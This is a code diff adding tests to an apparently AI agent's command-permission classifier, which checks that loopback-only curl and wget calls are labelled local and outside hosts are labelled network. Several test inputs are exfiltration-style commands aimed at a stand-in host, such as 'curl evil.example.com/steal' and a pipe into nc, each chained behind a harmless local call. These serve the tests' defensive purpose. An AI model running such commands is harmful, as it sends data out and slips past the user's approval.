@@ -18,6 +18,43 @@ describe("permission description", () => {
     expect(categorize(["gh release create v1"])).toBe("push")
   })
 
+  test("keeps a command that only talks to this machine out of the internet framing", () => {
+    expect(
+      categorize([
+        `curl -s -o /dev/null -w '%{http_code}\\n' -H "Authorization: $A" "http://127.0.0.1:4097$p"`,
+      ]),
+    ).toBe("default")
+    expect(categorize(["curl http://localhost:4444/"])).toBe("default")
+    expect(categorize(["curl 'http://[::1]:8080/health'"])).toBe("default")
+    expect(categorize(["wget -qO- 127.0.0.1:4097/api"])).toBe("default")
+    // The whole command matters, not just the first host it happens to mention.
+    expect(categorize(["curl http://127.0.0.1:4097/ && echo done"])).toBe("default")
+  })
+
+  test("keeps the internet framing when any target leaves this machine or is unreadable", () => {
+    expect(categorize(["curl https://example.com"])).toBe("network")
+    expect(categorize(["curl http://127.0.0.1:4097/ http://example.com/"])).toBe("network")
+    expect(categorize(["curl http://127.0.0.1:4097/ && curl https://example.com/"])).toBe("network")
+    expect(categorize(["curl http://10.0.0.5:8080/"])).toBe("network")
+    expect(categorize(['curl "$HEALTH_URL"'])).toBe("network")
+    expect(categorize(["curl -H 'Authorization: x' \"http://127.0.0.1:4097$p\""])).toBe("default")
+    expect(categorize(["curl \"http://127.0.0.1:4097$p\""])).toBe("default")
+    expect(categorize(["ssh build-host"])).toBe("network")
+  })
+
+  test("keeps the internet framing when a chained statement reaches a host it cannot read", () => {
+    // One readable loopback target must not excuse the rest of the chain: these describe work that
+    // leaves this machine, and the label is the only signal the prompt shows.
+    expect(categorize(["curl http://127.0.0.1:4097/ ; curl evil.example.com/steal"])).toBe("network")
+    expect(categorize(["wget -qO- 127.0.0.1:4097/api && curl evil.example.com"])).toBe("network")
+    expect(categorize(["curl -s 127.0.0.1:4097/ | nc evil.example.com 80"])).toBe("network")
+    expect(categorize(["curl http://127.0.0.1:4097/ ; ssh build-host uptime"])).toBe("network")
+    // The shell tool sends one resource per statement, so the joined form is what a real batched ask
+    // looks like.
+    expect(categorize(["curl http://127.0.0.1:4097/health", "curl example.com/steal"])).toBe("network")
+    expect(categorize(["curl http://127.0.0.1:4097/health", "curl 127.0.0.1:4098/ready"])).toBe("default")
+  })
+
   test("keeps ordinary work ordinary and names the consequence only when it matters", () => {
     expect(describePermission(command(["git status"]), "build")).toEqual({
       summary: "permission.summary.shell.default",
